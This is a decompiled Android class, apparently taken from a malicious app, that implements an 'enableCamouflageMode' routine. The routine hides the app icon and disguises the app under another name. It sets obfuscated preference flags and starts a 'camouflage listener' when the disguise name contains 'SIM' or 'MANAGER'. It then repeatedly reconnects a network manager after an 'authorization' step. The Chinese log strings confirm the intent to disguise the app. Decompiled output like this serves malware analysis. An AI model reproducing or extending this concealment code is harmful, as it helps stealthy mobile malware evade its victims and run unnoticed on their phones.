package com.storm.safe.rock.service;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import p000.AbstractC1262tj;
import p000.C0614i9;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.sc0;
import p000.t60;
import p000.yj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$enableCamouflageMode$2", m214403f = "dqtvuisjd.kt", m214404l = {15535}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$enableCamouflageMode$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52515a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52516a2;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$enableCamouflageMode$2$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
    /* renamed from: com.storm.safe.rock.service.dqtvuisjd$enableCamouflageMode$2$1 */
    final class C02921 extends SuspendLambda implements l10 {

        /* renamed from: a1 */
        public final /* synthetic */ dqtvuisjd f52517a1;

        /* renamed from: a2 */
        public final /* synthetic */ yj1 f52518a2;

        /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
        @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$enableCamouflageMode$2$1$1", m214403f = "dqtvuisjd.kt", m214404l = {15551}, m214405m = "invokeSuspend")
        /* renamed from: com.storm.safe.rock.service.dqtvuisjd$enableCamouflageMode$2$1$1, reason: invalid class name */
        final class AnonymousClass1 extends SuspendLambda implements l10 {

            /* renamed from: a1 */
            public long[] f52519a1;

            /* renamed from: a2 */
            public int f52520a2;

            /* renamed from: a3 */
            public int f52521a3;

            /* renamed from: a4 */
            public int f52522a4;

            /* renamed from: a5 */
            public long f52523a5;

            /* renamed from: a6 */
            public int f52524a6;

            /* renamed from: a7 */
            public final /* synthetic */ dqtvuisjd f52525a7;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            public AnonymousClass1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
                super(2, interfaceC0876mv);
                this.f52525a7 = dqtvuisjdVar;
            }

            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                return new AnonymousClass1(this.f52525a7, interfaceC0876mv);
            }

            @Override // p000.l10
            public final Object invoke(Object obj, Object obj2) {
                return ((AnonymousClass1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
            }

            /* JADX WARN: Removed duplicated region for block: B:14:0x004b  */
            /* JADX WARN: Removed duplicated region for block: B:21:0x0067 A[Catch: Exception -> 0x001d, TryCatch #0 {Exception -> 0x001d, blocks: (B:6:0x0019, B:19:0x0061, B:21:0x0067, B:23:0x006b, B:24:0x0085, B:26:0x008b, B:27:0x00b2, B:28:0x00b6), top: B:35:0x0019 }] */
            /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:18:0x0060 -> B:19:0x0061). Please report as a decompilation issue!!! */
            @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public final Object invokeSuspend(Object obj) throws Throwable {
                long[] jArr;
                int i;
                int i2;
                CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                int i3 = this.f52524a6;
                if (i3 == 0) {
                    kg1.m213544f4(obj);
                    jArr = new long[]{2000, 4000, 8000, 15000, 30000};
                    i = 0;
                    i2 = 5;
                    if (i < i2) {
                    }
                    return C1351vv.f60710b1;
                }
                if (i3 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                long j = this.f52523a5;
                i = this.f52522a4;
                i2 = this.f52521a3;
                int i4 = this.f52520a2;
                jArr = this.f52519a1;
                try {
                    kg1.m213544f4(obj);
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "❌ [网络] 授权完成后重连失败 (第" + (i + 1) + "次)", e);
                }
                C0323a8 c0323a8 = this.f52525a7.f52415e6;
                if (c0323a8 != null) {
                    if (c0323a8.f53103a3) {
                        t60.m214714d6("dqtvuisjd", "✅ [网络] 授权完成后重连成功 (第" + (i + 1) + "次)");
                    } else {
                        C0323a8 c0323a82 = this.f52525a7.f52415e6;
                        if (c0323a82 == null) {
                            t60.m214724f2("networkManager");
                            throw null;
                        }
                        c0323a82.m211643a8();
                        t60.m214714d6("dqtvuisjd", "🔄 [网络] 授权完成后尝试重连 (第" + (i + 1) + "次, 延迟" + j + "ms)");
                        i = i4 + 1;
                        if (i < i2) {
                            j = jArr[i];
                            try {
                            } catch (Exception e2) {
                                i4 = i;
                                t60.m214705c6("dqtvuisjd", "❌ [网络] 授权完成后重连失败 (第" + (i + 1) + "次)", e2);
                            }
                            this.f52519a1 = jArr;
                            this.f52520a2 = i;
                            this.f52521a3 = i2;
                            this.f52522a4 = i;
                            this.f52523a5 = j;
                            this.f52524a6 = 1;
                            if (b81.m210571b1(j, this) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            i4 = i;
                            C0323a8 c0323a83 = this.f52525a7.f52415e6;
                            if (c0323a83 != null) {
                            }
                        }
                    }
                }
                return C1351vv.f60710b1;
            }
        }

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public C02921(dqtvuisjd dqtvuisjdVar, yj1 yj1Var, InterfaceC0876mv interfaceC0876mv) {
            super(2, interfaceC0876mv);
            this.f52517a1 = dqtvuisjdVar;
            this.f52518a2 = yj1Var;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
            return new C02921(this.f52517a1, this.f52518a2, interfaceC0876mv);
        }

        @Override // p000.l10
        public final Object invoke(Object obj, Object obj2) throws Throwable {
            C02921 c02921 = (C02921) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
            C1351vv c1351vv = C1351vv.f60710b1;
            c02921.invokeSuspend(c1351vv);
            return c1351vv;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Object invokeSuspend(Object obj) throws Throwable {
            String str = this.f52518a2.f61328a1;
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
            kg1.m213544f4(obj);
            String strM212470a0 = StringUtil.m212470a0("I1AVP3IrGC9DNA==");
            dqtvuisjd dqtvuisjdVar = this.f52517a1;
            dqtvuisjdVar.getSharedPreferences(strM212470a0, 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), true).apply();
            dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new AnonymousClass1(dqtvuisjdVar, null), 2);
            if (!dqtvuisjdVar.f52477k8) {
                dqtvuisjdVar.m211460e9();
            }
            try {
                if (AbstractC0779a1.m213652a5(str, "SIM", true) || AbstractC0779a1.m213652a5(str, "MANAGER", true)) {
                    C0614i9 c0614i9 = dqtvuisjdVar.f52414e5;
                    if (c0614i9 != null) {
                        c0614i9.m213124b2();
                    }
                }
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ 启用伪装监听失败", e);
            }
            t60.m214702c3("dqtvuisjd", "🚀 [缓存] 应用名称缓存已清除");
            return C1351vv.f60710b1;
        }
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$enableCamouflageMode$2(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52516a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$enableCamouflageMode$2(this.f52516a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$enableCamouflageMode$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        dqtvuisjd dqtvuisjdVar = this.f52516a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52515a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                C0328b3 c0328b3 = dqtvuisjdVar.f52434g5;
                if (c0328b3 == null) {
                    t60.m214724f2("appIconHideManager");
                    throw null;
                }
                int i2 = C0328b3.f53186a7;
                yj1 yj1VarM211758a2 = c0328b3.m211758a2(false);
                if (yj1VarM211758a2.f61327a0) {
                    t60.m214714d6("dqtvuisjd", "✅ 伪装成功: " + yj1VarM211758a2.f61328a1);
                    C1180rh c1180rh = AbstractC1262tj.f60233a0;
                    C0785a0 c0785a0 = sc0.f59953a0;
                    C02921 c02921 = new C02921(dqtvuisjdVar, yj1VarM211758a2, null);
                    this.f52515a1 = 1;
                    if (AbstractC0780a0.m213696a7(c0785a0, c02921, this) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                } else {
                    t60.m214704c5("dqtvuisjd", "❌ 伪装失败: " + yj1VarM211758a2.f61329a2);
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 伪装异常", e);
        }
        return C1351vv.f60710b1;
    }
}
